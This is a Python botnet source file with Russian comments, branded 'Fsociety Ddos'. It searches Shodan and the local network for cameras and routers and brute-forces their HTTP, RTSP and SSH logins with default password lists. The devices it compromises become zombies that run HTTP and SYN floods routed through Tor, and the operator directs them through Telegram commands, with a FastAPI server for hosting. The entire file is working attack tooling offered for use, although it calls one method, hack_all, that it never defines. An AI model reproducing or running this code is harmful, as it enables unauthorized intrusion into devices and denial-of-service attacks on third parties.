#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HYBRID BOTNET – SHODAN EDITION (NO TELNETLIB)
- Глобальный поиск через Shodan
- Локальное сканирование (ping sweep)
- Улучшенный взлом камер/роутеров (HTTP, RTSP, SSH)
- Зомби-ботнет
- DDoS (HTTP flood)
- Управление через Telegram
- Веб-сервер для Railway
- Без telnetlib (совместимо с Python 3.13)
"""

import asyncio
import aiohttp
import aiohttp_socks
import random
import time
import json
import os
import subprocess
import paramiko
import requests
import base64
import socket
from contextlib import asynccontextmanager
from fastapi import FastAPI
import uvicorn
from cryptography.fernet import Fernet

# Shodan
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False
    print("[!] Shodan not installed. Install with: pip install shodan")

# ------------------------------------------------------------
#  БАЗОВЫЙ СПИСОК USER-AGENT (без огромного списка)
# ------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

# ------------------------------------------------------------
#  Конфигурация и пути
# ------------------------------------------------------------
DATA_DIR = os.environ.get("RAILWAY_VOLUME_MOUNT_PATH", "/app/data")
os.makedirs(DATA_DIR, exist_ok=True)

STATS_FILE = os.path.join(DATA_DIR, "stats.json")
BLOCKCHAIN_FILE = os.path.join(DATA_DIR, "blockchain.json")

def load_stats():
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE) as f:
            return json.load(f)
    return {"total_requests": 0, "cracked_devices": [], "global_found": 0}

def save_stats(stats):
    with open(STATS_FILE, 'w') as f:
        json.dump(stats, f)

stats = load_stats()

# ------------------------------------------------------------
#  Вспомогательные классы
# ------------------------------------------------------------
class ProxyManager:
    def __init__(self):
        self.socks_list = [('127.0.0.1', 9050)]
    def get_session(self):
        proxy = random.choice(self.socks_list)
        connector = aiohttp_socks.ProxyConnector.from_url(f'socks5://{proxy[0]}:{proxy[1]}')
        return aiohttp.ClientSession(connector=connector)

class CryptoLayer:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)

class BlockchainLogger:
    def log_attack(self, target, method, result):
        entry = {"target": target, "method": method, "result": result, "time": time.time()}
        with open(BLOCKCHAIN_FILE, "a") as f:
            json.dump(entry, f)
            f.write("\n")

# ------------------------------------------------------------
#  Зомби-ботнет
# ------------------------------------------------------------
class ZombieAgent:
    def __init__(self, ip, dtype, ssh=None):
        self.ip = ip
        self.type = dtype
        self.ssh = ssh
    async def execute_attack(self, target_url):
        if self.type == 'router' and self.ssh:
            try:
                self.ssh.exec_command(f"hping3 -S --flood --rand-source {target_url.split('/')[2]} -p 80")
            except:
                pass
        else:
            async with aiohttp.ClientSession() as session:
                for _ in range(50):
                    try:
                        await session.get(target_url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=2)
                    except:
                        pass
        return True

class ZombieBotnet:
    def __init__(self):
        self.zombies = []
    async def add_zombie(self, ip, dtype, ssh=None):
        self.zombies.append(ZombieAgent(ip, dtype, ssh))
    async def launch_attack(self, target):
        await asyncio.gather(*[z.execute_attack(target) for z in self.zombies])
    def size(self):
        return len(self.zombies)

# ------------------------------------------------------------
#  Локальный сканер (упрощённый ping sweep)
# ------------------------------------------------------------
class NetworkScanner:
    def __init__(self, network="192.168.1.0/24"):
        self.network = network
    async def ping_sweep(self):
        base = self.network.split('/')[0]
        ip_parts = base.split('.')
        if len(ip_parts) != 4:
            return []
        prefix = '.'.join(ip_parts[:3]) + '.'
        devices = []
        for i in range(1, 255):
            ip = prefix + str(i)
            proc = await asyncio.create_subprocess_exec(
                'ping', '-c', '1', '-W', '1', ip,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            code = await proc.wait()
            if code == 0:
                devices.append({'ip': ip, 'type': 'unknown'})
        return devices
    async def full_scan(self):
        try:
            return await self.ping_sweep()
        except:
            return []

# ------------------------------------------------------------
#  Улучшенный взломщик IoT (HTTP, RTSP, SSH)
# ------------------------------------------------------------
class IoTExploiter:
    def __init__(self, botnet):
        self.botnet = botnet
        self.usernames = [
            "admin", "root", "user", "support", "guest", "administrator", "operator",
            "service", "tech", "dvr", "ipcam", "admin1", "admin2", "supervisor"
        ]
        self.passwords = [
            "admin", "1234", "12345", "password", "pass", "123456", "root", "user",
            "support", "guest", "admin123", "adminadmin", "12345678", "123456789",
            "qwerty", "abc123", "111111", "000000", "888888", "666666", "admin1",
            "admin2", "ipcam", "dvr", "123", "password123", "letmein", "welcome",
            "changeme", "default", "1234567890", "123123", "0000", "1111", "222222"
        ]
        self.common_ports = [80, 8080, 554, 8000, 5000, 443, 8443, 37777, 81, 88]

    async def brute_http(self, ip, port, auth_type='basic'):
        for u in self.usernames:
            for p in self.passwords:
                try:
                    if auth_type == 'basic':
                        r = requests.get(f"http://{ip}:{port}", auth=(u, p), timeout=3)
                    else:
                        r = requests.get(f"http://{ip}:{port}", auth=requests.auth.HTTPDigestAuth(u, p), timeout=3)
                    if r.status_code == 200:
                        return (u, p)
                except:
                    continue
        return None

    async def brute_rtsp(self, ip, port=554):
        for u in self.usernames:
            for p in self.passwords:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((ip, port))
                    creds = base64.b64encode(f"{u}:{p}".encode()).decode()
                    sock.send(f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {creds}\r\n\r\n".encode())
                    data = sock.recv(1024)
                    if b'200 OK' in data:
                        sock.close()
                        return (u, p)
                    sock.close()
                except:
                    continue
        return None

    async def brute_ssh(self, ip, port=22):
        for u in self.usernames:
            for p in self.passwords:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, port=port, username=u, password=p, timeout=3)
                    return (u, p, client)
                except:
                    continue
        return None

    async def hack_camera(self, ip, port=None):
        if port:
            ports = [port]
        else:
            ports = self.common_ports
        for p in ports:
            creds = await self.brute_http(ip, p)
            if creds:
                await self.botnet.add_zombie(ip, "camera")
                stats["cracked_devices"].append(f"camera_{ip}:{p}")
                save_stats(stats)
                return True
            if p == 554:
                creds = await self.brute_rtsp(ip, p)
                if creds:
                    await self.botnet.add_zombie(ip, "camera")
                    stats["cracked_devices"].append(f"camera_{ip}_rtsp")
                    save_stats(stats)
                    return True
        return False

    async def hack_router(self, ip, port=None):
        creds = await self.brute_http(ip, port or 80)
        if creds:
            await self.botnet.add_zombie(ip, "router")
            stats["cracked_devices"].append(f"router_{ip}")
            save_stats(stats)
            return True
        ssh_creds = await self.brute_ssh(ip)
        if ssh_creds:
            u, p, client = ssh_creds
            await self.botnet.add_zombie(ip, "router", client)
            stats["cracked_devices"].append(f"router_{ip}_ssh")
            save_stats(stats)
            return True
        return False

    async def hack_device(self, ip, device_type=None, port=None):
        if device_type == 'camera':
            return await self.hack_camera(ip, port)
        elif device_type == 'router':
            return await self.hack_router(ip, port)
        else:
            if await self.hack_camera(ip, port):
                return True
            return await self.hack_router(ip, port)

# ------------------------------------------------------------
#  Глобальный поиск через Shodan
# ------------------------------------------------------------
class GlobalHunter:
    def __init__(self):
        self.shodan_key = os.environ.get("SHODAN_API_KEY")
        self.shodan_cli = None
        if SHODAN_AVAILABLE and self.shodan_key and self.shodan_key.strip():
            try:
                self.shodan_cli = shodan.Shodan(self.shodan_key)
            except Exception as e:
                print(f"Shodan init error: {e}")
    async def search_shodan(self, query, limit=100):
        if not self.shodan_cli:
            return []
        loop = asyncio.get_event_loop()
        try:
            res = await loop.run_in_executor(None, lambda: self.shodan_cli.search(query, limit=limit))
            devices = []
            for r in res.get('matches', []):
                devices.append({
                    'ip': r['ip_str'],
                    'port': r['port'],
                    'type': 'camera' if 'camera' in r.get('data','').lower() else 'router',
                    'source': 'shodan'
                })
            return devices
        except Exception as e:
            print(f"Shodan search error: {e}")
            raise e
    async def global_search(self, query, limit=100):
        return await self.search_shodan(query, limit)

# ------------------------------------------------------------
#  DDoS-движок
# ------------------------------------------------------------
class DDoSEngine:
    def __init__(self, proxy):
        self.proxy = proxy
    async def http_flood(self, url):
        async with self.proxy.get_session() as session:
            for _ in range(500):
                try:
                    await session.get(url, headers={"User-Agent": random.choice(USER_AGENTS)})
                except:
                    pass
        return True
    async def adapt_attack(self, target):
        await self.http_flood(target)
        return True

# ------------------------------------------------------------
#  Основной бот
# ------------------------------------------------------------
class AdminBot:
    def __init__(self):
        self.botnet = ZombieBotnet()
        self.scanner = NetworkScanner()
        self.exploiter = IoTExploiter(self.botnet)
        self.hunter = GlobalHunter()
        self.ddos = DDoSEngine(ProxyManager())
        self.blockchain = BlockchainLogger()
        self.berserk = False
        self.telegram_app = None

    async def start_local_scan_loop(self, interval=300):
        while True:
            devices = await self.scanner.full_scan()
            await self.exploiter.hack_all(devices)
            await asyncio.sleep(interval)

    async def start_telegram_bot(self):
        token = os.environ.get("TELEGRAM_TOKEN")
        if not token:
            print("TELEGRAM_TOKEN not set")
            return
        try:
            from telegram.ext import Application, CommandHandler
        except ImportError:
            print("python-telegram-bot not installed")
            return
        app = Application.builder().token(token).build()

        async def tg_start(update, context):
            await update.message.reply_text(
                "Fsociety Ddos:\nБот запущен. Доступные команды:\n"
                "/ddos <target>\n"
                "/global_scan <query> [limit]\n"
                "/status\n"
                "/hack_device <ip> <camera|router> [port]"
            )

        async def tg_ddos(update, context):
            target = context.args[0] if context.args else ""
            if not target:
                await update.message.reply_text("Использование: /ddos <target>")
                return
            await self.ddos.adapt_attack(target)
            await self.botnet.launch_attack(target)
            await update.message.reply_text(f"Fsociety Ddos:\nАтака на {target} запущена с {self.botnet.size()} зомби.")

        async def tg_global_scan(update, context):
            query = context.args[0] if context.args else "webcam"
            limit = int(context.args[1]) if len(context.args) > 1 else 50
            try:
                devices = await self.hunter.global_search(query, limit)
                if not devices:
                    msg = f"Fsociety Ddos:\nНайдено 0 устройств. Проверьте Shodan API ключ и запрос."
                else:
                    for dev in devices:
                        if dev['type'] == 'camera':
                            await self.exploiter.hack_camera(dev['ip'])
                        else:
                            await self.exploiter.hack_router(dev['ip'])
                    msg = f"Fsociety Ddos:\nНайдено {len(devices)} устройств, взлом запущен."
            except Exception as e:
                msg = f"Fsociety Ddos:\nОшибка: {str(e)}"
            await update.message.reply_text(msg)

        async def tg_status(update, context):
            msg = (f"Fsociety Ddos:\nЗомби: {self.botnet.size()}\n"
                   f"Взломано локально: {len(stats['cracked_devices'])}\n"
                   f"Глобально найдено: {stats['global_found']}")
            await update.message.reply_text(msg)

        async def tg_hack_device(update, context):
            if len(context.args) < 2:
                await update.message.reply_text("Использование: /hack_device <ip> <camera|router> [port]")
                return
            ip = context.args[0]
            dtype = context.args[1] if context.args[1] in ['camera', 'router'] else None
            port = None
            if len(context.args) > 2:
                try:
                    port = int(context.args[2])
                except:
                    pass
            res = await self.exploiter.hack_device(ip, dtype, port)
            if res:
                await update.message.reply_text(f"Fsociety Ddos:\nУстройство {ip} взломано и добавлено в ботнет.")
            else:
                await update.message.reply_text(f"Fsociety Ddos:\nНе удалось взломать {ip}. Попробуйте указать порт или другой тип.")

        app.add_handler(CommandHandler("start", tg_start))
        app.add_handler(CommandHandler("ddos", tg_ddos))
        app.add_handler(CommandHandler("global_scan", tg_global_scan))
        app.add_handler(CommandHandler("status", tg_status))
        app.add_handler(CommandHandler("hack_device", tg_hack_device))

        await app.initialize()
        await app.start()
        await app.updater.start_polling()
        self.telegram_app = app
        print("Telegram bot started")

    async def run_background(self):
        asyncio.create_task(self.start_local_scan_loop())
        if os.environ.get("TELEGRAM_TOKEN"):
            asyncio.create_task(self.start_telegram_bot())

# ------------------------------------------------------------
#  FastAPI веб-сервер для Railway
# ------------------------------------------------------------
bot_instance = AdminBot()

@asynccontextmanager
async def lifespan(app: FastAPI):
    asyncio.create_task(bot_instance.run_background())
    yield

app = FastAPI(lifespan=lifespan)

@app.get("/")
async def root():
    return {"status": "bot running", "zombies": bot_instance.botnet.size()}

@app.get("/status")
async def status():
    return {
        "zombies": bot_instance.botnet.size(),
        "cracked_local": len(stats["cracked_devices"]),
        "global_found": stats["global_found"],
        "total_requests": stats["total_requests"]
    }

# ------------------------------------------------------------
#  Точка входа
# ------------------------------------------------------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
